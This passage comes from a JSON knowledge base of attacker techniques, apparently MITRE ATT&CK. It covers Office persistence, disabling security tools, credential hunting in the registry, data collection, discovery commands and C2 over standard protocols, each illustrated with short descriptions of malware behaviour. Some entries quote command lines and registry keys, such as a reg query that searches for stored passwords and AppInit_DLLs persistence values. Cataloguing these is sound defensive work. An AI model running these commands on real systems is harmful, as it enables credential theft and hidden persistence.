    "similar_words": [
      "Startup Items"
    ]
  },
  "attack-pattern--2c4d4e92-0ccf-4a97-b54c-86d662988a53": {
    "description": "Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started.\n\n### Office Template Macros\n\nMicrosoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. (Citation: Microsoft Change Normal Template)\n\nOffice Visual Basic for Applications (VBA) macros (Citation: MSDN VBA in Office) can inserted into the base templated and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded. (Citation: enigma0x3 normal.dotm) (Citation: Hexacorn Office Template Macros)\n\nWord Normal.dotm location:C:\\Users\\(username)\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm\n\nExcel Personal.xlsb location:C:\\Users\\(username)\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB\n\nAn adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.\n\n### Office Test\n\nA Registry location was found that when a DLL reference was placed within it the corresponding DLL pointed to by the binary path would be executed every time an Office application is started (Citation: Hexacorn Office Test)\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\n\n### Add-ins\n\nOffice add-ins can be used to add functionality to Office programs. (Citation: Microsoft Office Add-ins)\n\nAdd-ins can also be used to obtain persistence because they can be set to execute code when an Office application starts. There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), and Visual Studio Tools for Office (VSTO) add-ins. (Citation: MRWLabs Office Persistence Add-ins)",
    "example_uses": [
      "has used the Office Test persistence mechanism within Microsoft Office by adding the Registry key HKCU\\Software\\Microsoft\\Office test\\Special\\Perf to execute code."
    ],
    "id": "T1137",
    "name": "Office Application Startup",
    "similar_words": [
      "Office Application Startup"
    ]
  },
  "attack-pattern--2e0dd10b-676d-4964-acd0-8a404c92b044": {
    "description": "Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security scanning or event reporting.",
    "example_uses": [
      "has disabled host-based firewalls. The group has also globally opened port 3389.",
      "terminates anti-malware processes if they’re found running on the system.",
      "disables the Windows firewall before binding to a port.",
      "kills antimalware running process.",
      "opens the Windows Firewall to modify incoming connections.",
      "terminates antimalware processes.",
      "malware can attempt to disable security features in Microsoft Office and Windows Defender using the taskkill command.",
      "kills security tools like Wireshark that are running.",
      "has a command to disable routing and the Firewall on the victim’s machine.",
      "can open the Windows Firewall on the victim’s machine to allow incoming connections.",
      "lower disable security settings by changing Registry keys.",
      "can change Internet Explorer settings to reduce warnings about malware activity.",
      "can disable Microsoft Office Protected View by changing Registry keys.",
      "can disable Avira anti-virus.",
      "can alter the victim's proxy configuration.",
      "The \"ZR\" variant of  will check to see if known host-based firewalls are installed on the infected systems.  will attempt to establish a C2 channel, then will examine open windows to identify a pop-up from the firewall software and will simulate a mouse-click to allow the connection to proceed.",
      "kills anti-virus found on the victim.",
      "has the ability to change firewall settings to allow a plug-in to be downloaded.",
      "has used appcmd.exe to disable logging on a victim server.",
      "kills and disables services for Windows Firewall, Windows Security Center, and Windows Defender.",
      "identifies and kills anti-malware processes.",
      "has functionality to disable security tools, including Kaspersky, BitDefender, and MalwareBytes.",
      "can be used to disable local firewall settings.",
      "can add or remove applications or ports on the Windows firewall or disable it entirely.",
      "Various  malware modifies the Windows firewall to allow incoming connections or disable it entirely using .  malware TangoDelta attempts to terminate various processes associated with McAfee. Additionally,  malware SHARPKNOT disables the Microsoft Windows System Event Notification and Alerter services.",
      "Malware used by  attempts to terminate processes corresponding to two components of Sophos Anti-Virus (SAVAdminService.exe and SavService.exe).",
      "may use  to add local firewall rule exceptions."
    ],
    "id": "T1089",
    "name": "Disabling Security Tools",
    "similar_words": [
      "Disabling Security Tools"
    ]
  },
  "attack-pattern--2edd9d6a-5674-4326-a600-ba56de467286": {
    "description": "The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.\n\nExample commands to find Registry keys related to password information: (Citation: Pentestlab Stored Credentials)\n\n* Local Machine Hive: reg query HKLM /f password /t REG_SZ /s\n* Current User Hive: reg query HKCU /f password /t REG_SZ /s",
    "example_uses": [
      "has several modules that search the Windows Registry for stored credentials: Get-UnattendedInstallFile, Get-Webconfig, Get-ApplicationHost, Get-SiteListPassword, Get-CachedGPPPassword, and Get-RegistryAutoLogon.",
      "may be used to find credentials in the Windows Registry."
    ],
    "id": "T1214",
    "name": "Credentials in Registry",
    "similar_words": [
      "Credentials in Registry"
    ]
  },
  "attack-pattern--30208d3e-0d6b-43c8-883e-44462a514619": {
    "description": "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of [Scripting](https://attack.mitre.org/techniques/T1064) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. This functionality could also be built into remote access tools. \n\nThis technique may incorporate use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) and [Remote File Copy](https://attack.mitre.org/techniques/T1105) to identify and move files.",
    "example_uses": [
      "used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks.",
      "developed a file stealer to search C:\\ and collect files with certain extensions.  also executed a script to enumerate all drives, store them as a list, and upload generated files to the C2 server.",
      "monitors USB devices and copies files with certain extensions to\na predefined directory.",
      "executes a batch script to store discovery information in %TEMP%\\info.dat and then uploads the temporarily file to the remote C2 server.",
      "recursively generates a list of files within a directory and sends them back to the control server.",
      "saves each collected file with the automatically generated format {0:dd-MM-yyyy}.txt .",
      "Each time a new drive is inserted,  generates a list of all files on the drive and stores it in an encrypted file.",
      "automatically collects data about the victim and sends it to the control server.",
      "has used automated collection.",
      "A  VBScript receives a batch script to execute a set of commands in a command prompt.",
      "scans processes on all victim systems in the environment and uses automated scripts to pull back the results.",
      "ran a command to compile an archive of file types of interest from the victim user's directories.",
      "automatically collects files from the local system and removable drives based on a predefined list of file extensions on a regular timeframe.",
      "monitors browsing activity and automatically captures screenshots if a victim browses to a URL matching one of a list of strings.",
      "searches removable storage devices for files with a pre-defined list of file extensions (e.g. * .doc, *.ppt, *.xls, *.docx, *.pptx, *.xlsx). Any matching files are encrypted and written to a local user directory.",
      "For all non-removable drives on a victim,  executes automated collection of certain files for later exfiltration.",
      "has used a script to iterate through a list of compromised PoS systems, copy data to a log file, and remove the original data files."
    ],
    "id": "T1119",
    "name": "Automated Collection",
    "similar_words": [
      "Automated Collection"
    ]
  },
  "attack-pattern--30973a08-aed9-4edf-8604-9084ce1b5c4f": {
    "description": "Adversaries may collect data stored in the Windows clipboard from users copying information within or between applications. \n\n### Windows\n\nApplications can access clipboard data by using the Windows API. (Citation: MSDN Clipboard) \n\n### Mac\n\nOSX provides a native command, pbpaste, to grab clipboard contents  (Citation: Operating with EmPyre).",
    "example_uses": [
      "steals data stored in the clipboard.",
      "can retrieve the current content of the user clipboard.",
      "can steal clipboard contents.",
      "collects data stored in the clipboard.",
      "contains code to open and copy data from the clipboard.",
      "A  variant accesses a screenshot saved in the clipboard and converts it to a JPG image.",
      "The executable version of  has a module to log clipboard contents.",
      "collects data from the clipboard.",
      "contains functionality to collect information from the clipboard.",
      "copies and exfiltrates the clipboard contents every 30 seconds."
    ],
    "id": "T1115",
    "name": "Clipboard Data",
    "similar_words": [
      "Clipboard Data"
    ]
  },
  "attack-pattern--317fefa6-46c7-4062-adb6-2008cf6bcb41": {
    "description": "Dynamic-link libraries (DLLs) that are specified in the AppInit_DLLs value in the Registry keys HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows or HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. (Citation: Endgame Process Injection July 2017) Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values can be abused to obtain persistence and privilege escalation by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. (Citation: AppInit Registry)\n\nThe AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. (Citation: AppInit Secure Boot)",
    "example_uses": [
      "Some variants of  use AppInit_DLLs to achieve persistence by creating the following Registry key: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows \"AppInit_DLLs\"=\"pserver32.dll\"",
      "If a victim meets certain criteria,  uses the AppInit_DLL functionality to achieve persistence by ensuring that every user mode process that is spawned will load its malicious DLL, ResN32.dll. It does this by creating the following Registry keys: HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs – %APPDATA%\\Intel\\ResN32.dll and HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\LoadAppInit_DLLs – 0x1."
    ],
    "id": "T1103",
    "name": "AppInit DLLs",
    "similar_words": [
      "AppInit DLLs"
    ]
  },
  "attack-pattern--322bad5a-1c49-4d23-ab79-76d641794afa": {
    "description": "Adversaries may try to get information about registered services. Commands that may obtain information about services using operating system utilities are \"sc,\" \"tasklist /svc\" using [Tasklist](https://attack.mitre.org/software/S0057), and \"net start\" using [Net](https://attack.mitre.org/software/S0039), but adversaries may also use other tools as well.",
    "example_uses": [
      "collects a list of running services with the command tasklist /svc.",
      "enumerates all running services.",
      "runs the command: net start >> %TEMP%\\info.dat on a victim.",
      "has a feature to list the available services on the system.",
      "uses tasklist /svc to display running tasks.",
      "collects a list of install programs and services on the system’s machine.",
      "can obtain running services on the victim.",
      "creates a backdoor through which remote attackers can monitor services.",
      "can list running services.",
      "can enumerate services.",
      "has used sc query on a victim to gather information about services.",
      "queries the system to identify existing services.",
      "can query service configuration information.",
      "executes net start after initial communication is made to the remote server.",
      "runs the command net start on a victim.",
      "collects information on programs and services on the victim that are configured to automatically run at startup.",
      "has the ability to discover and manipulate Windows services.",
      "The net start command can be used in  to find information about Windows services.",
      "has the capability to execute the command net start to interact with services.",
      "may use net start to display running services.",
      "can be used to discover services running on a system.",
      "After compromising a victim,  discovers all running services.",
      "actors used the following command following exploitation of a machine with  malware to obtain information about services: net start >> %temp%\\download",
      "surveys a system upon check-in to discover running services and associated processes using the tasklist /svc command.",
      "performs service discovery using net start commands."
    ],
    "id": "T1007",
    "name": "System Service Discovery",
    "similar_words": [
      "System Service Discovery"
    ]
  },
  "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529": {
    "description": "Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning](https://attack.mitre.org/techniques/T1171), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (ex: IP addressing, hostnames, VLAN IDs) necessary for follow-on Lateral Movement and/or Defense Evasion activities.",
    "example_uses": [
      "deployed the open source tool Responder to conduct NetBIOS Name Service poisoning, which captured usernames and hashed passwords that allowed access to legitimate credentials.",
      "captures hashes and credentials that are sent to the system after the name services have been poisoned.",
      "appears to have functionality to sniff for credentials passed over HTTP, SMTP, and SMB."
    ],
    "id": "T1040",
    "name": "Network Sniffing",
    "similar_words": [
      "Network Sniffing"
    ]
  },
  "attack-pattern--327f3cc5-eea1-42d4-a6cd-ed34b7ce8f61": {
    "description": "Adversaries may deploy malicious software to systems within a network using application deployment systems employed by enterprise administrators. The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the deployment server, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform software deployment.\n\nAccess to a network-wide or enterprise-wide software deployment system enables an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.",
    "example_uses": [
      "compromised McAfee ePO to move laterally by distributing malware as a software deployment task."
    ],
    "id": "T1017",
    "name": "Application Deployment Software",
    "similar_words": [
      "Application Deployment Software"
    ]
  },
  "attack-pattern--3489cfc5-640f-4bb3-a103-9137b97de79f": {
    "description": "Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \n\n### Windows\n\nFile sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia Shared Resource) (Citation: TechNet Shared Folder)\n\n[Net](https://attack.mitre.org/software/S0039) can be used to query a remote system for available shared drives using the net view \\\\remotesystem command. It can also be used to query shared drives on the local system using net share.\n\nAdversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement.\n\n### Mac\n\nOn Mac, locally mounted shares can be viewed with the df -aH command.",
    "example_uses": [
      "identified and browsed file servers in the victim network, sometimes , viewing files pertaining to ICS or Supervisory Control and Data Acquisition (SCADA) systems.",
      "can gather network share information.",
      "collects a list of network shares with the command net share.",
      "can scan local network for open SMB.",
      "has the capability to retrieve information about shares on remote hosts.",
      "can list local and remote shared drives and folders over SMB.",
      "listed remote shared drives that were accessible from a victim.",
      "can query shared drives on the local system.",
      "discovers shares on the network",
      "The net view \\\\remotesystem and net share commands in  can be used to find shared drives and directories on remote and local systems respectively."
    ],
    "id": "T1135",
    "name": "Network Share Discovery",
    "similar_words": [
      "Network Share Discovery"
    ]
  },
  "attack-pattern--348f1eef-964b-4eb6-bb53-69b3dcb0c643": {
    "description": "Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.",
    "example_uses": [
      "searches through connected drives for removable storage devices.",
      "obtains the number of removable drives from the victim.",
      "checks for new hard drives on the victim, such as USB devices, by listening for the WM_DEVICECHANGE window message.",
      "can list connected devices.",
      "can gather very specific information about attached USB devices, to include device instance ID and drive geometry.",
      "can obtain a list of smart card readers attached to the victim.",
      "monitors victims for insertion of removable drives. When dropped onto a second victim, it also enumerates drives connected to the system.",
      "A module in  collects information on available printers and disk drives.",
      "contains the showBackupIosFolder function to check for IOS device backups by running ls -la ~/Library/Application\\ Support/MobileSync/Backup/.",
      "tools contained an application to check performance of USB flash drives.",
      "has used tools with the functionality to search for specific information about the attached hard drive that could be used to identify and overwrite the firmware.",
      "uses a module to receive a notification every time a USB mass storage device is inserted into a victim."
    ],
    "id": "T1120",
    "name": "Peripheral Device Discovery",
    "similar_words": [
      "Peripheral Device Discovery"
    ]
  },
  "attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1": {
    "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture.\n\n### Windows\n\nExample commands and utilities that obtain this information include ver, [Systeminfo](https://attack.mitre.org/software/S0096), and dir within [cmd](https://attack.mitre.org/software/S0106) for identifying information based on present files and directories.\n\n### Mac\n\nOn Mac, the systemsetup command gives a detailed breakdown of the system, but it requires administrative privileges. Additionally, the system_profiler gives a very detailed breakdown of configurations, firewall rules, mounted volumes, hardware, and many other things without needing elevated permissions.",
    "example_uses": [
      "gathers computer name and information using the systeminfo command.",
      "collects the computer name and host name on the compromised system.",
      "checks if the victim OS is 32 or 64-bit.",
      "collects the OS version and computer name.",
      "collects the OS name, machine name, and architecture information.",
      "collects hard drive content and system configuration information.",
      "gathers computer names, OS version info, and also checks installed keyboard layouts to estimate if it has been launched from a certain list of countries.",
      "can gather the disk volume information.",
      "collected system architecture information.  used an HTTP malware variant and a Port 22 malware variant to gather the hostname and CPU information from the victim’s machine.",
      "collects the computer name, the BIOS model, and execution path.",
      "collects the hostname of the victim machine.",
      "collects endpoint information using the systeminfo command.",
      "has the capability to collect the computer name, language settings, the OS version, CPU information, disk devices, and time elapsed since system start.",
      "collects the OS version, country name, MAC address, computer name, physical memory statistics, and volume information for all drives on the system.",
      "checks for information on the CPU fan, temperature, mouse, hard disk, and motherboard as part of its anti-VM checks.",
      "gathers information on the system and local drives.",
      "has a command to gather system information from the victim’s machine.",
      "can gather information on the mapped drives, OS version, computer name, and memory size.",
      "gathers BIOS versions and manufacturers, the number of CPU cores, the total physical memory, and the computer name.",
      "gathers system information, network addresses, disk type, disk free space, and the operation system version.",
      "uses systeminfo on a victim’s machine.",
      "collects general system enumeration data about the infected machine and checks the OS version.",
      "gathers the computer name, the serial number of the main disk volume, CPU information, Microsoft Windows version, and runs the command systeminfo.",
      "collects the MAC address, computer name, and CPU information.",
      "collects OS version information such as registered owner details, manufacturer details, processor type, available storage, installed patches, hostname, version info, system date, and other system information by using the commands systeminfo, net config workstation, hostname, ver, set, and date /t.",
      "can collect CPU and architecture information from the victim’s machine.",
      "gathers information about the OS architecture, OS name, and OS version/Service pack.",
      "gathers the OS version, CPU type, amount of RAM available from the victim’s machine.",
      "has the capability to gather the system’s hostname and OS version.",
      "gathers the OS version, logical drives information, processor information, and volume information.",
      "has a command to gather system information from the victim’s machine.",
      "collects the computer name and serial number for the storage volume C:\\.",
      "collects the victim’s computer name, processor architecture, OS version, and volume serial number.",
      "has the capability to gather the OS version and computer name.",
      "obtains the victim computer name and encrypts the information to send over its C2 channel.",
      "gathers volume drive information and system information.",
      "gathers the computer name and checks the OS version to ensure it doesn’t run on a Windows XP or Windows Server 2003 systems.",
      "can retrieve OS name/architecture and computer/domain name information from compromised hosts.",
      "can discover and collect victim system information.",
      "can collect system information.",
      "can collect system information.",
      "creates a backdoor through which remote attackers can retrieve information such as hostname and free disk space.",
      "can obtain system information such as OS version and disk space.",
      "creates a backdoor through which remote attackers can retrieve information such as computer name, OS version, processor speed, memory size, and CPU speed.",
      "can gather the victim OS version and whether it is 64 or 32 bit.",
      "creates a backdoor through which remote attackers can retrieve system information.",
      "can identify system information, including battery status.",
      "can grab a system’s information including the OS version, architecture, etc.",
      "collects a unique identifier (UID) from a compromised host.",
      "can gather information about the host.",
      "collects and sends system information to its C2.",
      "gathers the victim's computer name, Windows version, and system language, and then sends it to its C2 server.",
      "is capable of gathering system information.",
      "can collect system information, including computer name, system manufacturer, IsDebuggerPresent state, and execution path.",
      "has the capability to retrieve information about the OS.",
      "can gather the victim computer name and serial number.",
      "can gather system information, the computer name, OS version, drive and serial information from the victim's machine.",
      "obtained OS version and hardware configuration from a victim.",
      "malware has used a PowerShell command to check the victim system architecture to determine if it is an x64 machine. Other malware has obtained the OS version, UUID, and computer/host name to send to the C2 server.",
      "collects the victim host name and serial number, and then sends the information to the C2 server.",
      "has run hostname and systeminfo on a victim.",
      "can collect operating system (OS) version information, processor information, system name, and information about installed disks from the victim.",
      "has a tool that can obtain information about the local system.",
      "may collect information about the system by running hostname and systeminfo on a victim.",
      "checks the victim OS version after executing to determine where to drop files based on whether the victim is 32-bit or 64-bit.",
      "discovers information about the infected machine.",
      "collects system information from the victim, including CPU speed, computer name, volume serial number, ANSI code page, OEM code page identifier for the OS, Microsoft Windows version, and memory information.",
      "collects the system information, including hostname and OS version, and sends it to the C2 server.",
      "sends an OS version identifier in its beacons.",
      "executes systeminfo after initial communication is made to the remote server.",
      "can run  to gather information about the victim.",
      "gathers system configuration information.",
      "has a command to collect victim system information, including the system name and OS version.",
      "A module in  collects information from the victim about Windows OS version, computer name, battery info, and physical memory.",
      "can be used to gather information about the operating system.",
      "can be used to find information about the operating system.",
      "A system info module in  gathers information on the victim host’s configuration.",
      "has the ability to obtain a victim's system name and operating system version.",
      "contains the getInstalledAPP function to run ls -la /Applications to gather what applications are installed.",
      "collects system information, including the operating system version and hostname.",
      "has the capability to execute ver, systeminfo, and gpresult commands.",
      "obtains a build identifier as well as victim hard drive information from Windows registry key HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum. Another  variant gathers the victim storage volume serial number and the storage device name.",
      "collects hostname, volume serial number and OS version data from the victim and sends the information to its C2 server.",
      "contains a command to collect the victim PC name and operating system.",
      "gathers the name of the local host, version of GNU Compiler Collection (GCC), and the system information about the CPU, machine, and operating system.",
      "can obtain information about the OS, processor, and BIOS.",
      "collects the victim hostname, window resolution, and Microsoft Windows version.",
      "can gather the victim computer name.",
      "gathers and beacons the operating system build number and CPU Architecture (32-bit/64-bit) during installation.",
      "has a command to upload to its C2 server victim mobile device information, including IMEI, IMSI, SIM card serial number, phone number, Android version, and other information.",
      "can obtain the computer name, OS version, and default language identifier.",
      "can obtain the victim hostname, Windows version, RAM amount, number of drives, and screen resolution.",
      "extracts basic information about the operating system.",
      "is capable of retrieving information about the infected system.",
      "The initial beacon packet for  contains the operating system version and file system of the victim.",
      "can obtain information about the victim computer name, physical memory, country, and date.",
      "can gather extended system information including the hostname, OS version number, platform, memory information, time elapsed since system startup, and CPU information.",
      "has used  to gather the OS version, as well as information on the system configuration, BIOS, the motherboard, and the processor.",
      "The initial beacon packet for  contains the operating system version and file system of the victim.",
      "has the ability to enumerate system information.",
      "has commands to get information about the victim's name, build, version, serial number, and memory usage.",
      "obtains the victim's operating system version and keyboard layout and sends the information to the C2 server.",
      "collects the system name, OS version including service pack, and system install date and sends the information to the C2 server.",
      "is capable of gathering system information.",
      "During its initial execution,  extracts operating system information from the infected host.",
      "can obtain the OS version information, computer name, processor architecture, machine role, and OS edition.",
      "sends information to its hard-coded C2, including OS version, service pack information, processor speed, system name, and OS install date.",
      "collects the computer name, OS versioning information, and OS install date and sends the information to the C2.",
      "has the ability to enumerate system information.",
      "collects information about the OS and computer name.",
      "The initial beacon packet for  contains the operating system version of the victim.",
      "A  file stealer can gather the victim's computer name and drive serial numbers to send to a C2 server.",
      "collected the victim computer name, OS version, and architecture type and sent the information to its C2 server.  also enumerated all available drives on the victim's machine.",
      "malware gathers system information via WMI, including the system directory, build number, serial number, version, manufacturer, model, and total physical memory.",
      "Several  malware families collect information on the type and version of the victim OS, as well as the victim computer name and CPU information. A Destover-like variant used by  also collects disk space information and sends it to its C2 server.",
      "actors used the following commands after exploiting a machine with  malware to obtain information about the OS: ver >> %temp%\\download systeminfo >> %temp%\\download",
      "surveys a system upon check-in to discover operating system configuration details using the systeminfo and set commands.",
      "performs operating system information discovery using systeminfo."
    ],
    "id": "T1082",
    "name": "System Information Discovery",
    "similar_words": [
      "System Information Discovery"
    ]
  },
  "attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6": {
    "description": "Adversaries may communicate using a common, standardized application layer protocol such as HTTP, HTTPS, SMTP, or DNS to avoid detection by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.\n\nFor connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are RPC, SSH, or RDP.",
    "example_uses": [
      "has performed C2 using DNS via A, OPT, and TXT records.",
      "malware has used HTTP for C2.",
      "has used HTTP and HTTPS for C2 communications.",
      "uses HTTP for C2 communications.",
      "uses HTTP for C2 communications.",
      "uses HTTP for C2 communications.",
      "uses HTTPS to communicate with its C2 servers, to get malware updates, modules that perform most of the malware logic and various configuration files.",
      "has used HTTPS and DNS tunneling for C2. The group has also used the Plink utility to create SSH tunnels.",
      "used SMB for C2.",
      "used HTTP for C2 communications.  also used an HTTP malware variant to communicate over HTTP for C2.",
      "uses HTTPS to conceal C2 communications.",
      "uses FTP for command and control.",
      "Some  variants have used South Korea's Daum email service to exfiltrate information, and later variants have posted the data to a web server via an HTTP post command.",
      "uses HTTP for command and control communication.",
      "uses DNS for the C2 communications.",
      "malware RoyalCli and BS2005 have communicated over HTTP with the C2 server through Internet Explorer (IE) by using the COM interface IWebBrowser2. Additionally,  malware RoyalDNS has used DNS for C2.",
      "uses HTTP for communication to the control servers.",
      "uses HTTP and HTTPS to communicate with the C2 server.",
      "uses HTTP for command and control.",
      "uses HTTPS for C2 communications.",
      "uses HTTPS for C2.",
      "use HTTPS for all command and control communication methods.",
      "version of  communicates with their server over a TCP port using HTTP payloads Base64 encoded and suffixed with the string “&&&”",
      "uses HTTP for communication with the C2 server.",
      "has used HTTP for C2.",
      "uses HTTP for C2 communication.",
      "uses HTTPS for command and control.",
      "uses the email platform, Naver, for C2 communications, leveraging SMTP.",
      "has used HTTP for C2, including sending error codes in Cookie headers.",
      "uses HTTPS, HTTP, and DNS for C2 communications.",
      "uses HTTP over SSL to communicate commands with the control server.",
      "uses HTTP/HTTPS for command and control communication.",
      "uses HTTP for C2.",
      "After using raw sockets to communicate with its C2 server,  uses a decrypted string to create HTTP POST requests.",
      "uses HTTP, HTTPS, FTP, and FTPS to communicate with the C2 server.  can also act as a webserver and listen for inbound HTTP requests through an exposed API.",
      "uses HTTP for C2 communications.",
      "uses HTTP for C2.",
      "has used HTTP for C2.",
      "uses HTTP for C2 communications.",
      "A  malware sample conducts C2 over HTTP.",
      "establishes a backdoor over HTTP.",
      "has exfiltrated data in HTTP POST headers.",
      "uses HTTP for C2.",
      "creates a backdoor by making a connection using a HTTP POST.",
      "enables remote interaction and can obtain additional code over HTTPS GET and POST requests.",
      "has used HTTP for C2.",
      "provides access to the system via SSH or any other protocol that uses PAM to authenticate.",
      "can communicate over HTTP for C2.",
      "executes code using HTTP POST commands.",
      "can communicate over FTP and send email over SMTP.",
      "has used JavaScript that communicates over HTTP or HTTPS to attacker controlled domains to download additional frameworks.",
      "malware has used HTTP for C2.",
      "uses HTTP for C2.",
      "has used HTTP and DNS for C2. The group has also used the Plink utility and other tools to create tunnels to C2 servers.",
      "can use HTTP or DNS for C2.",
      "uses DNS for C2.",
      "communicates to its C2 server over HTTP.",
      "uses RDP to tunnel traffic from a victim environment.",
      "malware has used HTTP and IRC for C2.",
      "communicates with its C2 servers over HTTP.",
      "Some  variants use HTTP for C2.",
      "uses HTTP for C2.",
      "can use HTTP and DNS for C2 communications.",
      "The  malware communicates to its command server using HTTP with an encrypted payload.",
      "has used both HTTP and HTTPS for C2.",
      "implements a command and control protocol over HTTP.",
      "communicates with its C2 server over HTTPS.",
      "communicates over HTTP or HTTPS for C2.",
      "uses HTTP and HTTPS for command and control.",
      "uses HTTP for command and control.",
      "uses HTTP for C2.",
      "uses HTTP for command and control.",
      "communicates to its C2 server over HTTP and embeds data within the Cookie HTTP header.",
      "uses HTTP for command and control.",
      "uses HTTP as a transport to communicate with its command server.",
      "uses HTTP or HTTPS for C2.",
      "uses HTTP for command and control.",
      "uses GET and POST requests over HTTP or HTTPS for command and control to obtain commands and send ZLIB compressed data back to the C2 server.",
      "main method of communicating with its C2 servers is using HTTP or HTTPS.",
      "connects to port 80 of a C2 server using Wininet API.",
      "uses HTTP and HTTPS for command and control.",
      "Various implementations of  communicate with C2 over HTTP, SMTP, and POP3.",
      "has used HTTP requests for command and control.",
      "uses a custom command and control protocol that is encapsulated in HTTP, HTTPS, or DNS. In addition, it conducts peer-to-peer communication over Windows named pipes encapsulated in the SMB protocol. All protocols use their standard assigned ports.",
      "has used HTTP, HTTPS, and DNS for command and control.",
      "One variant of  uses HTTP and HTTPS for C2.",
      "command and control occurs via HTTPS over port 443.",
      "will attempt to detect if the infected host is configured to a proxy. If so,  will send beacons via an HTTP POST request; otherwise it will send beacons via UDP/6000.  will also use HTTP to download resources that contain an IP address and Port Number pair to connect to for further C2. Adversaries can also use  to establish an RDP connection with a controller over TCP/7519.",
      "uses incoming HTTP requests with a username keyword and commands and handles them as instructions to perform actions.",
      "can communicate over HTTP, SMTP, and POP3 for C2.",
      "The  C2 channel uses HTTP POST requests.",
      "uses HTTPS for C2.",
      "can be configured to use HTTP or DNS for command and control.",
      "can communicate using HTTP or HTTPS.",
      "can use HTTP or HTTPS for command and control to hard-coded C2 servers.",
      "has used , a RAT that uses HTTP to communicate.",
      "uses a custom command and control protocol that communicates over commonly used ports, and is frequently encapsulated by application layer protocols.",
      "Some variants of  use SSL to communicate with C2 servers.",
      "uses HTTP for C2.",
      "can communicate to its C2 over HTTP and HTTPS if directed.",
      "uses HTTP for C2.",
      "network traffic can communicate over HTTP.",
      "variants have communicated with C2 servers over HTTP and HTTPS.",
      "is capable of using HTTP, HTTPS, SMTP, and DNS for C2.",
      "uses HTTP and HTTPS for C2.",
      "can use HTTP for C2.",
      "uses DNS as its C2 protocol.",
      "communicates with its C2 server over HTTP.",
      "uses HTTP for C2.",
      "uses SSL to encrypt its communication with its C2 server.",
      "uses HTTP and HTTPS for C2.",
      "The \"Uploader\" variant of  visits a hard-coded server over HTTP/S to download the images  uses to receive commands.",
      "transfers files from the compromised host via HTTP or HTTPS to a C2 server.",
      "uses HTTP for C2.",
      "contains the ftpUpload function to use the FTPManager:uploadFile method to upload files from the target system.",
      "uses DNS TXT records for C2.",
      "The  malware platform supports many standard protocols, including HTTP, HTTPS, and SMB.",
      "uses DNS TXT records for C2.",
      "uses HTTP for command and control.",
      "communicates with its C2 server over HTTP.",
      "can use HTTP or SMTP for C2.",
      "communicates via DNS for C2.",
      "communicates over HTTP for C2.",
      "A  file stealer can communicate over HTTP for C2.",
      "malware communicates with its C2 server via HTTPS.",
      "used the Plink command-line utility to create SSH tunnels to C2 servers.",
      "used SMTP as a communication channel in various implants, initially using self-registered Google Mail accounts and later compromised email servers of its victims. Later implants such as  use a blend of HTTP and other legitimate channels, depending on module configuration."
    ],
    "id": "T1071",
    "name": "Standard Application Layer Protocol",
    "similar_words": [
      "Standard Application Layer Protocol"
    ]
  },
  "attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9": {
